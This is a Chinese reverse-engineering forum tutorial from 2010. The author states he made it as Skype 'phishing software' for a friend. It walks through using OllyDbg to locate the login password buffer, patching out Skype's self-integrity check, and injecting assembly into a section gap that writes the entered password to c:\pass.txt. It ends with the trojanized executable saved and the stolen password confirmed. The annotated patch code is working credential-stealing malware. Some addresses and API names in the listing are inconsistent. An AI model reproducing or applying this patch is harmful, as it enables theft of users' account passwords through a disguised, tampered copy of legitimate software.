
# 对 Skype 的 Pediy

> 原文：[`www.pediy.com/kssd/pediy11/107948.html`](https://www.pediy.com/kssd/pediy11/107948.html)

- 【文章标题】: 对 Skype 的 Pediy
- 【文章作者】: Monster[B.S.T]
- 【作者邮箱】: suphack@vip.qq.com
- 【作者主页】: [www.bugging.com.cn](http://www.bugging.com.cn)
- 【作者 QQ 号】: 389264167
- 【软件名称】: Skype
- 【下载地址】: 自己搜索下载
- 【编写语言】: C
- 【使用工具】: OllyDBG
- 【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!

---

## 详细过程

写这个这个文章很久了，发在[www.bugging.com.cn](http://www.bugging.com.cn)上一直没人看，今天发到这里来

好悲哀啊，恐怖的高考终于结束了，都好久没来上网了，技术又退步了 N 多啊，现在正好有空，就过来放松下，刚上 QQ，一哥们就给我找上活了，让我给他做个 Skype 的钓鱼软件，哎，我就日了，本来就没时间上网，结果一上网就搞这些没技术含量的活，技术不退步才怪呢！

做了一个多小时，生成出来看看，这下对自己的审美观是彻底没信心了，VC 用惯了，VS 死不上手，日了。

一看到这里就再没有信心继续做下去了，不急，先来根黑兰州香烟缓缓神。抽完烟后效果果然是不一样，突然灵机一动，哎，我笨啊，就这么做界面，肯定做不完美啊，那我们就直接用它原来的界面，对它进行一次 PEDIY 吧。

PEDIY 就是我们常说的代码二次开发，也就是在没有原码，没有接口的情况下对可执行文件进行扩充。对于代码的二次开发，一般来说有两种办法：

1. 利用汇编代码直接增加我们需要的功能。
2. 利用汇编代码增加一个接口，然后使用高级语言开发我们需要的功能。

对于第二种就是用高级语言写一函数做为输出函数，然后在原程序里直接 `Call` 调用就可以了。这里我们就来使用第一种方法，毕竟我们只需要一个记录密码的小功能，用不着太麻烦。

我们先拿出 `PEID` 来检查一下文件，结果说是用“Borland Delphi 6.0 - 7.0 [Overlay]”写的，可我在后来的分析中，根据发现是用 `C++ Builder` 写的，哎这什么年头啊，连 `PEID` 这小子都学会骗人了，真他妈的不让人活了。

接着我们把 `Skype` 加载到 `OD` 里分析一下，20 多 M 的东西一下加载到 `OD` 里，我可怜的机子本来就很破，这下差点卡死……%%5555%%！#￥%……\*（）\_+等了半天终于加载完成了，我们按 `F9` 让 `Skype` 在 `OD` 中先运行起来，到输入帐号密码的时候，我们使用命令插件执行命令“`BP GetWindowTextA`”看看能不能断下，结果却没有用，再“`BP GetWindowTextW`”试试，结果还真断下了。

先不管了，分析先，等我们分析完了再慢慢 BS 他。我们随便输入个帐号密码登录试试，结果刚输入一个字母程序就被断下了，我汗死，回到 `OD` 中，按 `Alt+B` 打开断点列表窗口，把刚才我们对 `GetWindowTextW` 下的那个断点先给删了，再按 `F9` 让它运行起来。

等到我们已经把帐号和密码都输入完了，现在我们再回到 `OD` 中，继续“`BP GetWindowTextW`”来下断，然后点一下登录按钮，程序就被 `OD` 断下了。

现在我们的 `OD` 正处于系统领空，我们先按 `Alt+F9` 让它返回程序领空，返回后的代码如下：

```
00492503  push eax                        ; |压入目标编辑框的句柄 
00492504  call <jmp.&user32.GetWindowTextW>   ; \\取出编辑框中的内容 
00492509  mov eax,dword ptr ds:[esi]        ;  把从编辑框中取出的内容放到 eax 里 
我们继续 F8 跟踪，等我们遇到一个 Retn 时，程序又返回到这里，代码如下： 
0063E637  call Skype1.004BBBEC              ;  获取编辑框内容，我们刚才就是从这个 Call 里出来的 
0063E63C  mov eax,dword ptr ss:[ebp-8]      ;  把得到的内容放到 eax 里 
```

跟踪到这里后我们需要注意一下 `eax` 寄存器里的内容，我们可以看见 `eax` 寄存器里存放的正是我们输入的密码（我输入的密码是 123456789）的指针。好的，既然这样的话我们只要在这里加几句代码把 `eax` 寄存器所指向的数据保存下来就 OK 了。

现在我们需要确定一下这里到底是不是按钮事件的代码，如果不是按钮事件的代码，那 `eax` 寄存器所指向的数据就不一定是密码了，我们继续按 `Alt+B` 打开断点列表窗口，删除刚才下的那个断点，然后对输入命令“`BP 0063E63C`”对

```
0063E63C  mov eax,dword ptr ss:[ebp-8]
```

这一句下断，接着按 `Ctrl+F2` 把重新程序重新加载一下，再按 `F9` 让程序运行起来，结果日了，居然还有自校验，看来我们还得继续分析啊，输入命令“`BP MessageBoxW`”对弹出对话框后下个断点，结果没反应，没事，我们再来“`BP MessageBoxA`”，结果成功的断在了自校验弹出窗口的地方，现在我真是对这个程序员无语了，一会 ANSI，一会又 UNICODE 的，真 BT。

现在我们按 `Alt+F9` 让 `OD` 回到程序领空，返回后我们会看见这样的代码：

```
00E17C7F  test al,al                    ;  自校验是否通过 
00E17C81  jnz short Skype.00E17CA0      ;  通过则跳走 
00E17C83  push 30                       ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL 
00E17C85  push Skype.00E17F30           ; |Title = "Skype" 
00E17C8A  push Skype.00E17F38           ; |Text = "Error: Unfortunately the Skype executable is corrupted. Please re-install." 
00E17C8F  push 0                        ; |hOwner = NULL 
00E17C91  call <jmp.&user32.MessageBoxA> ; \\弹出对话框 
00E17C96  push 26AD                     ; /ExitCode = 26AD 
00E17C9B  call <jmp.&kernel32.ExitProcess> ; \\结束程序
```

我们可以看见第二句是个条件跳转语句，他检查自校验是否通过，如果通过就跳走，这里我们必须要让这个跳转实现，所以我们只要把这一句改成 `jmp 00E17CA0` 就可以了，双击这一句代码，修改完成后在 `OD` 中点击鼠标右键选择“复制到可执行文件”然后会弹出一个窗口，我们继续在弹出的窗口中点击鼠标右键选择“保存文件”，就会弹出一个的保存对话框，现在就可以把我们刚才修改过的的文件保存下来了。现在我们用 `OD` 加载刚才我们已经修改过的文件，执行命令“`BP 0063E63C`”，继续对我们刚才得到的地址下断，然后按 `F9` 让程序运行起来，我们输入帐号密码后按登录按钮程序又被断了下来，现在我们只要对程序代码稍稍修改，让它把这时 `eax` 所指向的数据保存下来就 OK 了。

现在我们就来为程序扩充功能，在这里我们需要了解三个函数：

- `CreateFileW` 打开（创建）文件，后面有 W 是因为它是 unicode 版的
- `WriteFile` 向打开的文件里写入内容
- `CloseHandle` 关闭文件

好的，我们再看看这三个函数的原形：

```
HANDLE CreateFile( 
    LPCTSTR lpFileName, 
    DWORD dwDesiredAccess, 
    DWORD dwShareMode, 
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, 
    DWORD dwCreationDisposition, 
    DWORD dwFlagsAndAttributes, 
    HANDLE hTemplateFile 
); 
BOOL WriteFile( 
    HANDLE hFile, 
    LPCVOID lpBuffer, 
    DWORD nNumberOfBytesToWrite, 
    LPDWORD lpNumberOfBytesWritten, 
    LPOVERLAPPED lpOverlapped 
); 
BOOL CloseHandle( 
    HANDLE hObject 
);
```

在这里我们需要注意，API 函数采用的是_stdcall 调用约定，参数从右到左入栈，并由被调用者来平衡堆栈。

在这里我们还需要知道这三个函数的调用地址，因为他们本来就在输入表中，我们就不用添加了，正好省了工夫，用 `LoadPE` 查看程序的输入表，选择 `kernel32.dll`，然后在下面的窗口中就可以找到我们需要的函数(记住一定要选上窗口右下角的“View always First Thunk”)，

我们可以看见 `CreateFileW` 所对应的 `ThunkRva` 是“00A68704”，那么他它调用地址就是 `ImageBase`（映象基址） + `ThunkRva`，我们这个程序的 `ImageBase` 是 `00400000`，所以 `CreateFileW` 函数的调用地址就是“00E68704”，等下我们调用 `CreateFileA` 函数时直接使用“00A68704”就可以了，这时候可能就会有朋友要问了，那我们使用“`call CreateFileA`”不行吗？那其实这也是可以的，程序也能运行，看起来好像没有什么问题，这时候是直接调用了本机的 `CreateFileA` 函数的入口地址，我们通常把这种方法称为硬编码。但是如果如果操作系统不同，或 `kernel32.dll` 不同，`CreateFileA` 的入口地址就有可能不同，程序就可能出错了。所以正确的做法是在输入表里加入我们需要调用的函数，让 `PE` 加载器来获得函数地址，再调用。

现在我们需要一断 00 区域来写入这些代码，因为我们只需要增加一个小功能，所以就用不着来增加一个区段了，由于 `PE` 文件每个区段的大小必定等于磁盘对齐值的整数倍，而区段的实际的代码或数据的大小不一定刚好是这么多，所以在不足的地方会以 00 来填充，这就是我们常说的区段间隙，我们把代码直接加在区段间隙里就可以了

我们再打开 `LoadPE`，查看目标程序的区段，可以看见 `text` 段的 `vsize` 是“00A127F0”，我们再来算出它的内存地址，如图 11，是 00E133F0。

现在我们再回到 `OD` 中，按 `Ctrl+G`，在弹出的窗口中输入刚才的地址，按确定后就可以来到这里，这里的确是一段 00 区，我们在这里写入以下代码，\\后是我加的注释，大家不要写进去:

```
pushad    \\保存现场 
push [esp-48]  \\保存密码长度到堆栈 
push [ebp-34]  \\保存密码到堆栈 
push 0 
push 80 
push 4 
push 0 
push 3 
push C0000000 
push 00E133B8  \\00E13FE5 指向字符串"c:\\pass.txt" 
call 00E68704  \\调用 CreateFileW 函数来打开文件 
push eax   \\保存句柄到堆栈 
lea eax,[esp-8]  \\传密码长度指针到 eax 
push 0 
push eax 
push [esp+10] 
push [esp+10] 
push [esp+10] 
call 00E684E0  \\调用 WriteFile 函数来写入密码到文件 
call 00E68720  \\调用 ColseHadnle 函数来关闭文件 
add esp,0C   \\平衡堆栈 
popad    \\恢复现场 
mov eax,[ebp-8] 
lea edx,[ebp-4]  \\这是从上面抽出的两句代码 
jmp 0063E642  \\跳回原代码 
     写完这里以后我们再看看上面的代码： 
0063E637  call Skype1.004BBBEC                ;  获取编辑框内容 
0063E63C  mov eax,dword ptr ss:[ebp-8]        ;  把得到的内容放到 eax 里 
0063E63F  lea edx,dword ptr ss:[ebp-4] 
0063E642  call Skype1.004DB334 
     现在我们把这里修改成： 
call  004BBBEC  \\原来的 call 
jmp 00E133B8  \\跳到我加增加的代码处 
nop    \\这里少了两句代码，我在上面加上了 
call 004DB334  \\原来的 call
```

现在修改已经完成了，

在 `OD` 中点击鼠标右键选择“复制到可执行文件”,按照刚才的步骤把修改后的文件保存下来。

最后行动一下我们修改后的文件，看走来效果不错，

程序正常，没有出错，输入帐号密码后来到 C 盘看看，

已经成功的取得了密码。

---

【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!

2010 年 02 月 28 日 上午 08:30:27
